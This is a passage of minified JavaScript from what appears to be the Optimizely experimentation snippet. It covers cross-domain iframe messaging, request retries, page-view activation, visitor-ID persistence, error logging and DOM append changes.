                if (g.warn("XDomain", "No stored message found for ID", t.id), i.isNumber(t.id)) {
                  var r = m.getNextMessageId();
                  t.id >= r ? c.emitInternalError(new _("Message ID is greater than expected maximum ID (" + t.id + ">" + r + ")")) : t.id < 0 ? c.emitInternalError(new _("Message ID is < 0: " + t.id)) : c.emitInternalError(new _("No stored message found for message ID: " + t.id));
                } else c.emitInternalError(new _("Message ID is not a number: " + t.id));
                return;
              }
              if (!e.resolver) return void g.warn("XDomain", "Message already resolved, ignoring:", t.id);
              e.resolver(t.response), u.dispatch(o.XDOMAIN_SET_MESSAGE, {
                messageId: t.id,
                message: {
                  data: {
                    id: t.id,
                    type: e.data.type,
                    key: e.data.key
                  },
                  startTime: e.startTime,
                  endTime: f.now()
                }
              });
            }
          } else g.debug("XDomain", "No frame found for origin: " + n.origin);
        }
        function y(n, t) {
          return t || (t = m.getDefaultFrame()), new r(function (e) {
            var r = {
              data: i.extend({}, n, {
                id: m.getNextMessageId()
              }),
              resolver: e
            };
            t ? m.isDisabled() || b(r, t) : u.dispatch(o.XDOMAIN_SET_MESSAGE, {
              messageId: r.data.id,
              message: r
            });
          });
        }
        function b(n, t) {
          var e = n.data;
          u.dispatch(o.XDOMAIN_SET_MESSAGE, {
            messageId: n.data.id,
            message: i.extend({}, n, {
              startTime: f.now()
            })
          }), t.target.postMessage(d.stringify(e), t.origin);
        }
        t.setItem = function (n, t, e) {
          return y({
            type: "PUT",
            key: n,
            value: t
          }, e);
        }, t.getItem = function (n, t) {
          return y({
            type: "GET",
            key: n
          }, t);
        }, t.fetchAll = function (n) {
          return y({
            type: "GETALL"
          }, n);
        }, t.deleteData = function (n, t) {
          return y({
            type: "DELETE",
            visitorId: n
          }, t);
        }, t.subscribe = function (n) {
          u.dispatch(o.XDOMAIN_ADD_SUBSCRIBER, {
            subscriber: n
          });
        }, t.loadIframe = function (n, t) {
          return new r(function (e) {
            var i = l.createElement("iframe");
            i.src = n + t, i.hidden = !0, i.setAttribute("tabindex", "-1"), i.setAttribute("title", "Optimizely Internal Frame"), i.style.display = "none", i.height = 0, i.width = 0, i.onload = function () {
              var r = {
                id: m.getNextFrameId(),
                target: i.contentWindow,
                origin: n,
                path: t
              };
              u.dispatch(o.XDOMAIN_ADD_FRAME, r), e(r);
            }, l.appendTo(l.querySelector("body"), i);
          });
        }, t.getXDomainUserId = function (n, t) {
          var e,
            r = {},
            o = i.keys(n);
          return i.each(t, function (n) {
            r[n] = [], i.each(o, function (t) {
              var o = h.getUserIdFromKey(t, n);
              !e && o && (e = o), o && !i.includes(r[n], o) && r[n].push(o);
            });
          }), g.debug("XDomain: Found userIds:", r), e;
        }, t.load = function (n, e) {
          p.addEventListener("message", w);
          return v.pollFor(function () {
            return !!l.querySelector("body");
          }).then(function () {
            return t.loadIframe(n, e);
          }).then(function (n) {
            u.dispatch(o.XDOMAIN_SET_DEFAULT_FRAME, n), m.isDisabled() || i.each(m.getMessages(), function (t) {
              t.startTime || b(t, n);
            });
          });
        };
      },
      3455: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(3792),
          a = e(4797),
          u = e(2676),
          c = e(2678),
          s = e(8398).Promise,
          f = e(2591);
        t.isCORSSupported = function () {
          return "withCredentials" in new (f.get("XMLHttpRequest"))();
        }, t.request = function (n) {
          return n = i.extend({
            method: "GET",
            async: !0,
            contentType: "text/plain;charset=UTF-8"
          }, n), new s(function (e, r) {
            if (!t.isCORSSupported()) return r("CORS is not supported");
            var o = new (f.get("XMLHttpRequest"))();
            o.onload = function () {
              n.success && n.success(o), e(o);
            }, o.onerror = function () {
              n.error && n.error(o), r(o);
            }, i.isObject(n.data) && (n.data = u.stringify(n.data)), o.open(n.method, n.url, n.async), n.withCredentials && (o.withCredentials = n.withCredentials), o.setRequestHeader("Content-Type", n.contentType), i.isObject(n.headers) && i.forEach(n.headers, function (n, t) {
              o.setRequestHeader(t, n);
            }), o.send(n.data);
          });
        }, t.retryableRequest = function (n, e, u, f) {
          if (!e) return s.reject(new Error("No id specified for request."));
          if (!t.isCORSSupported()) return s.reject(new Error("CORS is not supported."));
          i.isUndefined(f) && (f = 3), i.isUndefined(u) && (u = 0);
          var l = {
            id: e,
            timeStamp: o.now(),
            data: n,
            retryCount: u
          };
          return a.dispatch(r.SET_PENDING_EVENT, l), c.debug("Sending event ", e), t.request(n).then(function (n) {
            return a.dispatch(r.REMOVE_PENDING_EVENT, {
              id: e
            }), n;
          }, function (n) {
            throw l.retryCount >= f ? (a.dispatch(r.REMOVE_PENDING_EVENT, {
              id: e
            }), c.warn("Event ", l, " could not be sent after ", f, " attempts.")) : (l.retryCount++, a.dispatch(r.SET_PENDING_EVENT, l), c.debug("Event ", l, " failed to send, with error ", n, " It will be retried ", f - u, " times.")), n;
          });
        }, t.sendBeacon = t.request;
      },
      9840: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(2438),
          a = e(6227),
          u = e(3792),
          c = e(4041),
          s = e(8964),
          f = e(1372),
          l = e(4797),
          d = e(2678),
          v = e(1295),
          h = c.get("stores/event_data"),
          p = c.get("stores/plugins"),
          g = c.get("stores/rum"),
          m = c.get("stores/view"),
          _ = c.get("stores/view_data");
        function w(n, t) {
          i.forEach(n, function (n) {
            if (n.eventType !== f.CUSTOM) {
              var e = p.getPlugin(s.PluginTypes.eventImplementations, n.eventType);
              e ? t ? e.attach(n) : e.detach(n) : d.warn("No implementation found for event type:", n.eventType, "needed for event:", n);
            }
          });
        }
        t.parseViewTags = function (n) {
          var e = t.evaluateViewTags(n);
          t.setParsedViewTags(n.id, e);
        }, t.updateAllViewTags = function () {
          var n = m.getActiveViewStates();
          i.each(n, function (n) {
            var e = _.get(n.id);
            t.parseViewTags(e);
          });
        }, t.evaluateViewTags = function (n) {
          return n.tags ? i.reduce(n.tags, function (n, t) {
            try {
              n[t.apiName] = v.getTagValue(t);
            } catch (r) {
              e = r, (null != (i = v.Error) && "undefined" != typeof Symbol && i[Symbol.hasInstance] ? i[Symbol.hasInstance](e) : e instanceof i) ? d.warn("Page / Ignoring unparseable tag", t, r) : d.error(r);
            }
            var e, i;
            return n;
          }, {}) : {};
        }, t.createViewTicket = function () {
          var n = {};
          return i.each(p.getAllPlugins(s.PluginTypes.viewProviders), function (t) {
            n[t.provides] = c.evaluate(t.getter);
          }), n;
        }, t.registerViews = function (n) {
          l.dispatch(r.REGISTER_VIEWS, {
            views: n
          });
        }, t.activateViaAPI = function (n, e) {
          e && t.setUserSuppliedViewTags(n.id, e), t.activateMultiple([n], e);
        }, t.getViewsAndActivate = function (n) {
          var e = _.getAllViewsForActivationType(n);
          t.activateMultiple(e);
        }, t.activateMultiple = function (n, e) {
          var a = [];
          return i.each(n, function (n) {
            var u = m.getViewState(n.id),
              c = t.createViewTicket();
            if (u.isActive) {
              if (n.deactivationEnabled) try {
                t.hasValidStaticConditions(n, c) || t.deactivate(n);
              } catch (v) {
                d.error("Page / Error evaluating whether to deactivate page ", t.description(n), v);
              } else d.log("Not activating Page, already active ", t.description(n));
            } else {
              try {
                if (!t.hasValidStaticConditions(n, c)) return i.isBoolean(u.isActive) || t.setViewActiveState(n, !1), void d.log("Page / Failed to match page conditions for " + t.description(n), n.staticConditions);
              } catch (v) {
                return i.isBoolean(u.isActive) || t.setViewActiveState(n, !1), void d.error("Page / Error evaluating whether to activate page ", t.description(n), v);
              }
              if (a.push(n), t.setViewActiveState(n, !0), d.log("Activated Page", t.description(n)), o.emitViewActivated({
                view: n,
                metadata: e
              }), g.getSampleRum()) {
                var f = n.activationType || s.ViewActivationTypes.immediate;
                l.dispatch(r.RECORD_ACTIVATION_TYPE_USAGE, {
                  activationType: f,
                  entityId: n.id
                });
              }
              w(h.getByPageId(n.id), !0);
            }
          }), i.isEmpty(a) || o.emitViewsActivated({
            views: a
          }), a;
        }, t.deactivate = function (n) {
          m.getViewState(n.id).isActive ? (t.setViewActiveState(n, !1), d.log("Deactivated Page", t.description(n)), o.emitPageDeactivated({
            page: n
          }), w(h.getByPageId(n.id), !1)) : d.log("Not deactivating Page, already inactive ", t.description(n));
        }, t.setViewActiveState = function (n, t) {
          l.dispatch(r.SET_VIEW_ACTIVE_STATE, {
            view: n,
            timestamp: u.now(),
            isActive: t
          });
        }, t.setGlobalTags = function (n) {
          l.dispatch(r.SET_GLOBAL_TAGS, n);
        }, t.setParsedViewTags = function (n, t) {
          l.dispatch(r.UPDATE_PARSED_VIEW_METADATA, {
            pageId: n,
            metadata: t
          });
        }, t.setUserSuppliedViewTags = function (n, t) {
          l.dispatch(r.UPDATE_USER_SUPPLIED_METADATA, {
            pageId: n,
            metadata: t
          });
        }, t.hasValidStaticConditions = function (n, t) {
          var e = {};
          if (i.isEmpty(n.staticConditions)) return !0;
          var o = p.getAllPlugins(s.PluginTypes.viewMatchers);
          d.groupCollapsed("Page / Evaluating staticConditions:", n.staticConditions), d.debug("Matching to current value:", t);
          var u = a.evaluate(n.staticConditions, function (n) {
            var i = n.type,
              r = o[i];
            if (!r) throw new Error("Page / No matcher found for type=" + i);
            return r && (e[n.type] || (e[n.type] = !0)), r.match(t, n);
          });
          return d.groupEnd(), g.getSampleRum() && u && l.dispatch(r.RECORD_VIEW_FEATURE_USAGE, {
            featuresUsed: i.keys(e),
            entityId: n.id
          }), u;
        }, t.description = function (n) {
          return '"' + n.name + '" (' + n.id + ")";
        }, t.isActivationTypeImmediate = function (n) {
          return n === s.ViewActivationTypes.immediate || !n;
        }, t.shouldTriggerImmediately = function (n) {
          return n === s.ViewActivationTypes.DOMChanged || n === s.ViewActivationTypes.URLChanged || n === s.ViewActivationTypes.immediate || !n;
        }, t.create = function (n, t) {
          return {
            id: n,
            apiName: t,
            category: "other"
          };
        }, t.createState = function (n) {
          return {
            id: n,
            isActive: !0,
            metadata: {},
            parsedMetadata: {},
            userSuppliedMetadata: {}
          };
        };
      },
      1685: function (n, t, e) {
        var i,
          r = e(9576),
          o = e(4797),
          a = e(2805),
          u = e(5434),
          c = e(9314),
          s = e(8718),
          f = e(3792),
          l = e(4041),
          d = e(8964),
          v = e(2676),
          h = e(9196),
          p = e(4243).mM,
          g = e(2678),
          m = e(8398).Promise,
          _ = e(7918),
          w = e(8964).VisitorStorageKeys,
          y = e(2188);
        i = e(7581);
        var b = l.get("stores/cookie_options"),
          E = l.get("stores/global"),
          I = l.get("stores/layer"),
          A = l.get("stores/plugins"),
          T = l.get("stores/rum"),
          S = l.get("stores/session"),
          k = l.get("stores/visitor_id"),
          R = l.get("stores/visitor_bucketing"),
          N = l.get("stores/visitor"),
          D = l.get("stores/provider_status");
        function C(n, t) {
          var e = function (n, e) {
            var i;
            t.attributionType && (i = f.now()), o.dispatch(a.SET_VISITOR_ATTRIBUTES, {
              attributes: [{
                key: n,
                value: e,
                metadata: {
                  lastModified: i
                }
              }]
            });
          };
          if (t.getter) {
            var i = t.provides;
            if (r.isArray(i) || (i = [i]), !(t.isSticky && !r.isUndefined(h.getFieldValue(n, i)))) {
              var u;
              try {
                var c = l.evaluate(t.getter);
                r.isFunction(c) && (c = c(function () {
                  return h.getFieldValue(n, i);
                }, function (n) {
                  e(i, n);
                })), r.isUndefined(c) || (t.isAsync ? (u = c.then(function (n) {
                  e(i, n);
                }, function (n) {
                  g.warn('Failed to evaluate provider for "' + t.provides + '"; error was:', n);
                }), o.dispatch(a.SET_VISITOR_ATTRIBUTE_PENDING, {
                  key: i,
                  pending: u
                })) : e(i, c));
              } catch (s) {
                g.warn('Failed to evaluate getter for provider for "' + t.provides + '"; error was: ' + s.message);
              }
              return u;
            }
          }
        }
        function O(n) {
          var t = M(n),
            e = p.getItem(t);
          return r.isString(e) && (e = F(e)), e;
        }
        function x(n) {
          var t;
          if (n.layerId) t = n;else {
            var e = n;
            t = {
              layerId: e.i,
              pageId: e.p,
              decisionTimestamp: e.t,
              decisionTicket: {
                audienceIds: e.a || []
              },
              decision: {
                layerId: e.i,
                experimentId: e.x || null,
                variationId: e.v || null,
                isLayerHoldback: e.h || !1
              }
            };
          }
          return t;
        }
        function P(n, t, e) {
          try {
            var r = M(n);
            e || (t = v.stringify(t));
            try {
              p.setItem(r, t);
            } catch (o) {
              throw g.warn("Visitor / Unable to set localStorage key, error was:", o), new Error("Unable to set localStorage");
            }
            i.setItem(r, t);
          } catch (o) {
            g.warn("Unable to persist visitor data:", o.message);
          }
        }
        function M(n) {
          var e = k.getBucketingId();
          if (!e) throw new Error("Visitor bucketingId not set");
          var i = t.getNamespace();
          if (!i) throw new Error("Namespace is not set");
          return [e, i, n].join("$$");
        }
        function L(n, e) {
          if (!k.getBucketingId()) throw new Error("Cannot update local store because bucketingId not set");
          if (V(n)) {
            var i = t.getStorageKeyFromKey(n);
            if (r.includes(w, i)) {
              var u = M(i);
              if (!(n.indexOf(u) <= 0) && (e = F(e))) if (i === w.EVENT_QUEUE) o.dispatch(a.SET_FOREIGN_VISITOR_EVENT_QUEUE, {
                key: n,
                value: c.deserialize(e)
              });else if (i === w.EVENTS) o.dispatch(a.SET_FOREIGN_VISITOR_EVENTS, {
                key: n,
                value: c.deserialize(e)
              });else if (i === w.LAYER_STATES) o.dispatch(a.LOAD_PERSISTED_LAYER_STATES, {
                layerStates: r.map(e, x),
                merge: !0
              });else if (i === w.VARIATION_MAP) o.dispatch(a.MERGE_VARIATION_ID_MAP, {
                variationIdMap: e
              });else if (i === w.VISITOR_PROFILE) {
                var s = e;
                r.each(["custom"], function (n) {
                  var t = A.getPlugin(d.PluginTypes.visitorProfileProviders, n);
                  if (t) {
                    if (s.profile && s.metadata) {
                      var e = function (n, t, e) {
                        var i = N.getAttribute(t),
                          o = N.getAttributeMetadata(t),
                          a = n.profile[t],
                          u = n.metadata[t];
                        if (r.isEmpty(i)) return {
                          data: a,
                          metadata: u
                        };
                        var c = {};
                        return r.forOwn(a, function (n, t) {
                          var i, a;
                          o && o[t] && (i = o[t].lastModified), u && u[t] && (a = u[t].lastModified), (e === d.AttributionTypes.FIRST_TOUCH && i >= a || e === d.AttributionTypes.LAST_TOUCH && a >= i || r.isUndefined(i) && a) && (c.data = c.data || {}, c.data[t] = n, a && (c.metadata = c.metadata || {}, c.metadata[t] = c.metadata[t] || {}, c.metadata[t].lastModified = a));
                        }), c;
                      }(s, n, t.attributionType);
                      if (!r.isEmpty(e)) {
                        var i = [];
                        r.forOwn(e.data, function (t, r) {
                          var o = e.metadata[r],
                            a = {
                              key: [n, r],
                              value: t,
                              metadata: o
                            };
                          i.push(a);
                        }), o.dispatch(a.SET_VISITOR_ATTRIBUTES, {
                          attributes: i
                        });
                      }
                    }
                  } else g.debug("Attribute type", n, "not used by any audiences");
                });
              }
            }
          }
        }
        function V(n) {
          return n.split("$$")[0].indexOf("://") > 0;
        }
        function F(n) {
          try {
            return v.parse(n);
          } catch (t) {
            return g.debug("Failed to parse: ", n, t), null;
          }
        }
        t.getOrGenerateId = function () {
          return {
            randomId: t.getCurrentId() || "oeu" + f.now() + "r" + Math.random()
          };
        }, t.getCurrentId = function () {
          var n = k.getVisitorIdLocator();
          return N.getVisitorIdFromAPI() || (n ? function (n) {
            var t,
              e = n.name;
            switch (n.type) {
              case d.VisitorIdLocatorType.COOKIE:
                t = s.get(e);
                break;
              case d.VisitorIdLocatorType.JS_VARIABLE:
                t = y.getGlobalByPath(e);
                break;
              case d.VisitorIdLocatorType.LOCALSTORAGE:
                try {
                  t = y.getGlobal("localStorage").getItem(e);
                } catch (u) {
                  throw new Error("Unable to read localStorage: " + u.toString());
                }
                break;
              case d.VisitorIdLocatorType.QUERY:
                t = _.getQueryParamValue(e);
            }
            try {
              if (!t) throw g.error("Visitor / Customer provided visitor id cannot be found. Type:", n.type, " Name:", e), new Error("Failure to obtain visitor id from " + n.type);
              if (!r.isString(t) && !r.isNumber(t)) throw g.error("Visitor / Customer provided visitor id is not a string or number. Type:", n.type, " Name:", e, " Id Type:", (i = t) && "undefined" != typeof Symbol && i.constructor === Symbol ? "symbol" : typeof i), new Error("Customer provided visitor id is not a string or number");
            } catch (c) {
              throw T.getSampleRum() && o.dispatch(a.RECORD_VISITOR_ID_ERROR, {
                isError: !0
              }), c;
            }
            var i;
            T.getSampleRum() && (o.dispatch(a.RECORD_VISITOR_ID_ERROR, {
              isError: !1
            }), o.dispatch(a.RECORD_VISITOR_ID_LOCATOR_USAGE, {
              visitorIdLocatorType: n.type,
              entityId: t
            }));
            return String(t);
          }(n) : s.get(d.COOKIES.VISITOR_ID));
        }, t.hasSomeData = function () {
          return p.keys().length > 0;
        }, t.setId = function (n) {
          var e,
            c,
            f = k.getBucketingId();
          o.dispatch(a.SET_VISITOR_ID, n), k.getBucketingId() !== f && (!function () {
            !function (n, t) {
              0;
              u.initializeStore(n, t);
            }(O(w.EVENTS) || [], O(w.EVENT_QUEUE) || []);
            var n = (e = w.LAYER_STATES, i = k.getBucketingId(), c = [], s = new RegExp(i + "\\$\\$([^$]+?)\\$\\$" + e), r.each(p.keys(), function (n) {
              var t = n.match(s);
              if (t) {
                var e = {
                  namespace: t[1],
                  userId: i,
                  item: F(p.getItem(n))
                };
                c.push(e);
              }
            }), c);
            var e, i, c, s;
            r.forEach(n, function (n) {
              n.item = r.map(n.item, x);
            }), l = n, v = [], r.each(l, function (n) {
              r.each(n.item, function (t) {
                t.namespace = n.namespace, v.push(t);
              });
            }), g = v, o.dispatch(a.LOAD_PERSISTED_LAYER_STATES, {
              layerStates: r.filter(g, function (n) {
                return !!n.decision;
              })
            }), h = O(w.SESSION_STATE) || {}, h = r.extend({
              lastSessionTimestamp: 0,
              sessionId: null
            }, h), o.dispatch(a.LOAD_SESSION_STATE, h), function (n) {
              var t,
                e,
                i = A.getAllPlugins(d.PluginTypes.visitorProfileProviders),
                u = r.filter(i, function (n) {
                  return r.isFunction(n.restorer);
                });
              n.profile && n.metadata ? (t = n.profile, e = n.metadata) : (t = n, e = {});
              t = r.reduce(t, function (n, t, e) {
                var i = t,
                  o = r.find(u, {
                    provides: e
                  });
                return o && (i = o.restorer(t)), n[e] = i, n;
              }, {}), o.dispatch(a.LOAD_EXISTING_VISITOR_PROFILE, {
                profile: t,
                metadata: e
              });
            }(O(w.VISITOR_PROFILE) || {});
            var f = O(w.TRACKER_OPTIMIZELY);
            f && (m = f, o.dispatch(a.SET_TRACKER_PERSISTABLE_STATE, m));
            var l, v;
            var h;
            var g;
            var m;
            t.loadForeignData(), t.removeLegacySessionStateCookies();
          }(), t.deleteOldLocalData(), i.deleteData(n));
          try {
            k.getVisitorIdLocator() || t.maybePersistVisitorId(n);
          } catch (l) {
            if (g.error("Visitor / Unable to persist visitorId, disabling tracking"), o.dispatch(a.LOAD_DIRECTIVE, {
              trackingDisabled: !0
            }), e = l, null != (c = s.MismatchError) && "undefined" != typeof Symbol && c[Symbol.hasInstance] ? c[Symbol.hasInstance](e) : e instanceof c) throw g.error("Visitor / Cookie not set to correct value:", l), new Error("Cookie mismatch error while persisting visitorId");
            throw l;
          }
          t.refreshSession();
        }, t.getVariationIdMap = function () {
          return O(w.VARIATION_MAP) || {};
        }, t.updateVariationIdMap = function (n, t, e) {
          o.dispatch(a.UPDATE_VARIATION_ID_MAP, {
            layerId: n,
            experimentId: t,
            variationId: e
          });
        }, t.persistVariationIdMap = function () {
          var n = R.getVariationIdMapString();
          P(w.VARIATION_MAP, n, !0);
        }, t.getPreferredLayerMap = function () {
          return O(w.LAYER_MAP) || {};
        }, t.updatePreferredLayerMap = function (n, t) {
          o.dispatch(a.UPDATE_PREFERRED_LAYER_MAP, {
            groupId: n,
            layerId: t
          });
        }, t.persistTrackerOptimizelyData = function (n) {
          P(w.TRACKER_OPTIMIZELY, n);
        }, t.refreshSession = function () {
          o.dispatch(a.REFRESH_SESSION);
        }, t.populateEagerVisitorData = function (n, e) {
          var i = r.filter(n, function (n) {
            return !n.isLazy;
          });
          return t.populateVisitorData(i, e);
        }, t.populateLazyVisitorData = function (n, e) {
          var i = r.filter(n, function (n) {
            return n.isLazy;
          });
          return t.populateVisitorData(i, e);
        }, t.populateVisitorData = function (n, t) {
          t = t || {};
          var e = r.partial(C, t),
            i = r(n).filter({
              isAsync: !0
            }).map(e).filter().value();
          return r.forEach(r.filter(n, function (n) {
            return !n.isAsync;
          }), e), i.length > 0 ? m.all(i) : m.resolve();
        }, t.persistBehaviorEvents = function (n) {
          P(w.EVENTS, n);
        }, t.persistBehaviorEventQueue = function (n) {
          P(w.EVENT_QUEUE, n);
        }, t.getPersistedBehaviorEventCount = function () {
          var n = O(w.EVENTS) || [],
            t = O(w.EVENT_QUEUE) || [];
          return c.deserialize(n).length + c.deserialize(t).length;
        }, t.persistLayerStates = function () {
          var n = I.getLayerStates(t.getNamespace());
          n = r.map(n, function (n) {
            return r.omit(n, "namespace");
          }), P(w.LAYER_STATES, n);
        }, t.persistSessionState = function () {
          P(w.SESSION_STATE, S.getState());
        }, t.persistVisitorProfile = function () {
          P(w.VISITOR_PROFILE, function () {
            var n = N.getVisitorProfile(),
              t = N.getVisitorProfileMetadata(),
              e = A.getAllPlugins(d.PluginTypes.visitorProfileProviders);
            if (e) {
              var i = r.reduce(e, function (n, t) {
                return t.provides && (n[t.provides] = t), n;
              }, {});
              n = r.omitBy(n, function (n, t) {
                var e = i[t];
                return e && e.isTransient;
              });
            }
            return {
              profile: n,
              metadata: t
            };
          }());
        }, t.persistVisitorBucketingStore = function () {
          var n;
          t.persistVariationIdMap(), n = R.getPreferredLayerMapString(), P(w.LAYER_MAP, n, !0);
        }, t.getUserIdFromKey = function (n, e) {
          var i;
          return r.includes(n, e) && r.includes(n, "_") && r.includes(n, "$$") && r.includes(n.slice(n.indexOf("$$")), t.getNamespace()) && (i = n.slice(n.indexOf("_") + 1, n.indexOf("$$"))), i;
        }, t.maybePersistVisitorId = function (n) {
          n.randomId && (b.getAutoRefresh() || t.getCurrentId() !== n.randomId ? (s.set(d.COOKIES.VISITOR_ID, n.randomId), g.log("Persisting visitorId:", n.randomId)) : g.log("Not persisting visitorId: value is not changed and also auto-refresh is disabled"));
        }, t.getAttribute = function (n) {
          return N.getAttribute(n);
        }, t.getPendingAttributeValue = function (n) {
          return D.getPendingAttributeValue(n);
        }, t.isForeignKey = V, t.checkKeyForVisitorId = function (n) {
          var e = k.getBucketingId() || t.getCurrentId(),
            i = t.getIdFromKey(n);
          return !i || i === e;
        }, t.getIdFromKey = function (n) {
          var e = n.split("$$")[0],
            i = t.getStorageKeyFromKey(n);
          if (r.includes(d.StorageKeys, i)) return null;
          var o = e.indexOf("_");
          return -1 === o ? e : e.substring(o + 1);
        }, t.getStorageKeyFromKey = function (n) {
          var t,
            e = n.split("$$").pop();
          if (e.indexOf("://") > -1) {
            var i = e.indexOf("_");
            t = e.substring(i + 1);
          } else t = e;
          return r.includes(r.values(d.AllStorageKeys), t) ? t : null;
        }, t.deleteOldLocalData = function () {
          var n = p.keys();
          r.each(n, function (n) {
            t.isForeignKey(n) || t.checkKeyForVisitorId(n) || p.removeItem(n);
          });
        }, t.deleteOldForeignData = function () {
          var n = p.keys();
          r.each(n, function (n) {
            t.isForeignKey(n) && p.removeItem(n);
          });
        }, t.loadForeignData = function () {
          r.each(p.keys(), function (n) {
            var t = p.getItem(n);
            t && L(n, t);
          });
        }, t.getNamespace = function () {
          return E.getNamespace();
        }, t.serializeFieldKey = function (n) {
          return r.isArray(n) ? n.join("$$") : n;
        }, t.removeLegacySessionStateCookies = function () {
          var n = s.getAll();
          r.forEach(r.keys(n), function (n) {
            0 === n.indexOf(d.COOKIES.SESSION_STATE + "$$") && s.remove(n);
          });
        };
      },
      8955: function (n, t, e) {
        var i = e(9576),
          r = e(8964);
        t.normalizeClientData = function (n) {
          !n.listTargetingKeys && n.listTargetingCookies && (n.listTargetingKeys = i.map(n.listTargetingCookies, function (n) {
            return {
              type: r.ListTargetingKeyTypes.COOKIE,
              key: n
            };
          }), delete n.listTargetingCookies);
        };
      },
      5723: function (n, t, e) {
        e(4041).register("env/jquery", e(6911));
      },
      6911: function (n, t, e) {
        var i,
          r = e(2188);
        try {
          i = $;
        } catch (a) {}
        var o = r.getGlobal("$");
        n.exports = i && i !== o ? i : o;
      },
      5133: function (n) {
        n.exports = {};
      },
      6708: function (n, t, e) {
        function i(n, t) {
          return null != t && "undefined" != typeof Symbol && t[Symbol.hasInstance] ? !!t[Symbol.hasInstance](n) : n instanceof t;
        }
        var r = e(9576),
          o = e(6639).G,
          a = e(3792),
          u = e(4041),
          c = e(6954),
          s = e(2678),
          f = e(2188),
          l = e(3455),
          d = u.get("stores/client_metadata"),
          v = u.get("stores/global");
        function h(n) {
          return n && n.engine ? n.engine : d.getClientName();
        }
        t.handleError = function (n, t) {
          var e = function () {
              return l.request({
                url: "https://errors.client.optimizely.com/log",
                method: "POST",
                data: m,
                contentType: "application/json"
              }).then(function (n) {
                s.log("Error Monitor / Logged error with response: ", n);
              }, function (n) {
                s.error("Failed to log error, response was: ", n);
              });
            },
            u = n.name || "Error",
            p = n.message || "",
            g = n.stack || null;
          i(n, o) && (i(p, Error) ? (p = p.message, g = n.message.stack) : g = null);
          var m = {
              timestamp: a.now(),
              clientEngine: h(t),
              clientVersion: d.getClientVersion(),
              accountId: v.getAccountId(),
              projectId: v.getProjectId(),
              errorClass: u,
              message: p,
              stacktrace: g
            },
            _ = r.map(v.getExperimental(), function (n, t) {
              return {
                key: "exp_" + t,
                value: String(n)
              };
            });
          t && r.forEach(t, function (n, t) {
            r.isObject(n) || _.push({
              key: t,
              value: String(n)
            });
          }, []), r.isEmpty(_) || (m.metadata = _), s.error("Logging error", m), c.isLoaded() ? e() : f.addEventListener("load", e);
        };
      },
      7102: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(7989),
          a = e(8235),
          u = e(6639).U,
          c = e(4611),
          s = e(6530),
          f = e(4041).get("stores/directive"),
          l = e(6954),
          d = e(5557),
          v = e(4797),
          h = e(2678),
          p = e(2522),
          g = e(7246),
          m = e(9280).create(),
          _ = 1e3,
          w = 10,
          y = u("ChangeOverheatError");
        function b(n, t) {
          if (this.change = n, this.identifier = t.identifier, this.startTime = t.startTime, f.shouldObserveChangesIndefinitely()) {
            v.dispatch(r.INITIALIZE_CHANGE_METRICS), this.rateMeter = new p(_);
            var e = i.isNull(w) ? Number.POSITIVE_INFINITY : w;
            this.rateMeter.addListener(e, i.bind(function () {
              h.warn("AppendChange", this, "has overheated and will no longer apply or reapply"), this.cancel(), v.dispatch(r.RECORD_CHANGE_OVERHEATED), o.emitError(new y("Change " + this.identifier + " has overheated"), {
                layerId: t.action && t.action.layerId,
                experimentId: t.action && t.action.experimentId,
                variationId: t.action && t.action.variationId,
                changeId: n.id,
                changeType: n.type,
                movingWindowMilliseconds: _,
                maxMacroTasksInMovingWindow: e
              });
            }, this));
            for (var a = Math.min(e, 50), u = 0; u <= a; u++) this.rateMeter.addListener(u, i.partial(function (n) {
              v.dispatch(r.RECORD_CHANGE_MACROTASK_RATE, {
                changeMacrotaskRate: n
              });
            }, u));
          }
        }
        b.prototype.numberOfRootNodes = function (n) {
          var t = document.createElement("div");
          return t.innerHTML = n, t.childNodes.length;
        }, b.prototype.getSiblingElements = function (n, t, e) {
          for (var i = n, r = [], o = 0; o < t; o++) e ? (r.push(i.nextSibling), i = i.nextSibling) : (r.push(i.previousSibling), i = i.previousSibling);
          return r;
        }, b.prototype.apply = function () {
          this.applyDeferred = s();
          try {
            if (!this.numberOfRootNodes(this.change.value)) throw new Error("No DOM elements to be created for this change: " + this.change.value);
            var n = i.partial(this.applyDeferred.reject, new Error("Unable to find selector.")),
              t = {};
            f.shouldObserveChangesUntilTimeout() ? t = {
              timeout: i.partial(g.isTimedOut, this.startTime),
              onTimeout: n
            } : f.isEditor() && m.waitUntil(i.partial(g.isTimedOut, this.startTime)).then(n, n), this.unobserveSelector = m.observeSelector(this.change.selector, i.bind(this.maybeApplyToElement, this), t);
            var e = l.querySelectorAll(this.change.selector);
            i.each(e, i.bind(this.maybeApplyToElement, this));
          } catch (r) {
            this.applyDeferred.reject(r);
          }
          return this.applyDeferred;
        }, b.prototype.maybeApplyToElement = function (n) {
          var t = a.CHANGE_ID_ATTRIBUTE_PREFIX + this.change.id;
          if (n.hasAttribute(t)) return h.debug("Not applying AppendChange to element", n, "because it was inserted by this change"), void this.applyDeferred.resolve();
          this.rateMeter && this.rateMeter.countCurrentTick(), i.bind(this.applyOrReapplyToElement, this, n, t)(), this.applyDeferred.resolve();
        }, b.prototype.applyOrReapplyToElement = function (n, t) {
          var e;
          switch (this.change.operator) {
            case d.DOMInsertionType.AFTER:
              e = d.insertAdjacentHTMLType.AFTER_END;
              break;
            case d.DOMInsertionType.APPEND:
              e = d.insertAdjacentHTMLType.BEFORE_END;
              break;
            case d.DOMInsertionType.BEFORE:
              e = d.insertAdjacentHTMLType.BEFORE_BEGIN;
              break;
            case d.DOMInsertionType.PREPEND:
              e = d.insertAdjacentHTMLType.AFTER_BEGIN;
              break;
            default:
              e = d.insertAdjacentHTMLType.BEFORE_END;
          }
          n.insertAdjacentHTML(e, this.change.value), n.setAttribute(t, ""), c.setData(n, this.change.id, this.identifier, []);
          var r,
            o,
            a = this.numberOfRootNodes(this.change.value) - 1;
          e === d.insertAdjacentHTMLType.BEFORE_END ? (r = n.lastChild, o = this.getSiblingElements(r, a, !1)) : e === d.insertAdjacentHTMLType.AFTER_BEGIN ? (r = n.firstChild, o = this.getSiblingElements(r, a, !0)) : e === d.insertAdjacentHTMLType.BEFORE_BEGIN ? (r = n.previousSibling, o = this.getSiblingElements(r, a, !1)) : e === d.insertAdjacentHTMLType.AFTER_END && (r = n.nextSibling, o = this.getSiblingElements(r, a, !0)), o.unshift(r), i.each(o, i.bind(function (n) {
